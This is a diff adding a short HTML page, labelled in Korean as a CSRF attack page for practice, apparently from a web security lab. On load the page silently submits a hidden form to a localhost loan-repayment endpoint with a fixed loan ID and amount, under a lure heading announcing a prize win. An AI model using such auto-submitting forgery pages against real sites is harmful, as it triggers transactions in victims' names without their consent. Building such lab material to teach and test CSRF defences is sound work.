@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head><meta charset="UTF-8"><title>CSRF 공격 페이지 (실습용)</title></head>
+<body onload="document.forms[0].submit()">
+<!-- 사용자가 로그인한 상태에서 이 페이지를 열면 본인 모르게 상환 요청이 전송된다 -->
+<h1>이벤트 당첨!</h1>
+<form action="http://localhost:8080/repay-form" method="post">
+    <input type="hidden" name="loanId" value="1001">
+    <input type="hidden" name="amount" value="1000000">
+</form>
+</body>
+</html>
